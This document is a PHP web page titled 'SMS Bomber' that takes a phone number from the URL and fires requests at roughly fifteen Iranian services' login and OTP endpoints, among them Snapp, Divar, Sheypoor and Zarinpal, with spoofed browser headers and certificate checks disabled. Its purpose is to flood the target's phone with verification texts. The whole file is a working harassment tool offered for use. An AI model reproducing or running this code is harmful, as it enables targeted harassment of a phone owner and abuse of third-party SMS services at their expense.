<html style="background-color:Black; color:white;">
    <head>
        <title>SMS Bomber By AGC007™</title>
    </head>

<?php 

//////////////////// - Developed by AGC007 - ////////////////////

if($_GET["mobile"])
{

    $MobileNumber = $_GET["mobile"];
    
    echo "Mobile= " , "$MobileNumber";
    echo'</br>';
    echo 'Process Sucssfull!!';
    
/////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://www.baneh.com/mobilelogin/mobile/sentOtpByReg/?mobile=$MobileNumber";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp1 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://api.taaghche.com/v4/site/auth/login";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Accept-Encoding: gzip, deflate, br",
   "Accept-Language: fa,en-US;q=0.9,en;q=0.8",
   "Connection: keep-alive",
   "Content-Length: 42",
   "Content-Type: application/json",
   "Host: api.taaghche.com",
   "Origin: https://taaghche.com",
   "Referer: https://taaghche.com/",
   "sec-ch-ua-mobile: ?0",
   "Sec-Fetch-Dest: empty",
   "Sec-Fetch-Mode: cors",
   "Sec-Fetch-Site: same-site",
   "session: undefined",
   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"contact":"'.$MobileNumber.'","forceOtp":false}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp2 = curl_exec($curl);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://taraazws.jabama.com/api/v4/account/send-code";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Accept: application/json, text/plain",
   "Accept-Encoding: gzip, deflate, br",
   "Accept-Language: fa,en-US;q=0.9,en;q=0.8",
   "Connection: keep-alive",
   "Content-Length: 24",
   "Content-Type: application/json",
   "Host: taraazws.jabama.com",
   "Origin: https://www.jabama.com",
   "Referer: https://www.jabama.com/",
   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"mobile":"'.$MobileNumber.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp3 = curl_exec($curl);

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://sandbox.sibirani.ir/api/v1/user/invite";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "content-length: 26",
   "Content-Type: application/json",
   "origin: https://developer.sibirani.com",
   "referer: https://developer.sibirani.com/",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"username":"'.$MobileNumber.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp4 = curl_exec($curl);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://api.snapp.ir/api/v1/sms/link";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-encoding: gzip, deflate, br",
   "accept-language: fa,en-US;q=0.9,en;q=0.8",
   "content-length: 23",
   "Content-Type: application/json",
   "origin: https://snapp.ir",
   "referer: https://snapp.ir/",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"phone":"'.$MobileNumber.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp5 = curl_exec($curl);
    
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://www.sheypoor.com/api/v10.0.0/auth/send";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",
   "accept-encoding: gzip, deflate, br",
   "accept-language: fa,en-US;q=0.9,en;q=0.8",
   "content-length: 26",
   "Content-Type: application/json",
   "origin: https://www.sheypoor.com",
   "referer: https://www.sheypoor.com/session",
   "sec-ch-ua-mobile: ?0",
   "sec-fetch-dest: empty",
   "sec-fetch-mode: cors",
   "sec-fetch-site: same-origin",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"username":"'.$MobileNumber.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp6 = curl_exec($curl);

////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://api.divar.ir/v5/auth/authenticate";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json, text/plain",
   "accept-encoding: gzip, deflate, br",
   "accept-language: fa,en-US;q=0.9,en;q=0.8",
   "content-length: 23",
   "Content-Type: application/json",
   "origin: https://divar.ir",
   "referer: https://divar.ir/",
   "sec-ch-ua-mobile: ?0",
   "sec-fetch-dest: empty",
   "sec-fetch-mode: cors",
   "sec-fetch-site: same-site",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
   "x-standard-divar-error: true",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"phone":"'.$MobileNumber.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp7 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////////

$url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=$MobileNumber";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept-encoding: gzip, deflate, br",
   "accept-language: fa,en-US;q=0.9,en;q=0.8",
   "content-length: 2",
   "Content-Type: application/json",
   "origin: https://snapp.market",
   "referer: https://snapp.market/",
   "sec-ch-ua-mobile: ?0",
   "sec-fetch-dest: empty",
   "sec-fetch-mode: cors",
   "sec-fetch-site: same-site",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "{}";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp8 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$url = "https://shepino.com/wp-admin/admin-ajax.php";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept-encoding: gzip, deflate, br",
   "accept-language: en-US,en;q=0.9,fa;q=0.8",
   "content-length: 41",
   "origin: https://shepino.com",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
   "x-requested-with: XMLHttpRequest",
   "Content-Type: application/x-www-form-urlencoded",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "action=register_action&number=".$MobileNumber;

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
curl_close($curl);
    
$resp9 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$url = "https://jarchi.me/wp-admin/admin-ajax.php";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept-encoding: gzip, deflate, br",
   "accept-language: en-US,en;q=0.9,fa;q=0.8",
   "content-length: 41",
   "origin: https://jarchi.me",
   "referer: https://jarchi.me/",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
   "x-requested-with: XMLHttpRequest",
   "Content-Type: application/x-www-form-urlencoded",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "action=register_action&number=".$MobileNumber;

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp10 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$url = "https://appapi.sms.ir/api/app/auth/sign-up/verification-code";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(

   "content-length: 10",
   "Content-Type: application/json",
   "origin: https://app.sms.ir",
   "referer: https://app.sms.ir/",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = substr($MobileNumber,1);

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp11 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$url = "https://next.zarinpal.com/api/oauth/initialize";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "content-length: 26",
   "origin: https://next.zarinpal.com",
   "referer: https://next.zarinpal.com/auth/login",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
   "Content-Type: application/json",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"username":"'.$MobileNumber.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp12 = curl_exec($curl);
    

/////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$url = "https://api.vandar.io/v2/register/check/mobile";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json",

   "access-control-allow-origin: *",
   "content-length: 24",
   "Content-Type: application/json",
   "origin: https://dash.vandar.io",
   "referer: https://dash.vandar.io/",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
   "withcredentials: false",
   "x-csrftoken: example-of-custom-header",
   "x-requested-with: XMLHttpRequest",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"mobile":"'.$MobileNumber.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp13 = curl_exec($curl);
    
/////////////////////////////////////////////////////////////////////////////////////////////////////////
    
$url = "https://api.atipay.net/user/otp";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "accept: application/json, text/plain",
   "accept-encoding: gzip, deflate, br",
   "accept-language: en-US,en;q=0.9,fa;q=0.8",
   "content-length: 30",
   "Content-Type: application/json",
   "origin: https://panel.atipay.net",
   "referer: https://panel.atipay.net/",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"mobileNumber":"'.$MobileNumber.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp14 = curl_exec($curl);

/////////////////////////////////////////////////////////////////////////////////////////////////////////    
    
$url = "https://www.portal.ir/site/api/v1/user/validate";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "content-length: 24",
   "Content-Type: application/json",
   "origin: https://www.portal.ir",
   "referer: https://www.portal.ir/help/faq/choose-payment-gateway",

   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"mobile":"'.$MobileNumber.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp15 = curl_exec($curl);
    
/////////////////////////////////////////////////////////////////////////////////////////////////////////

//////////////////// - Developed by AGC007 - ////////////////////
} ?>

</html>

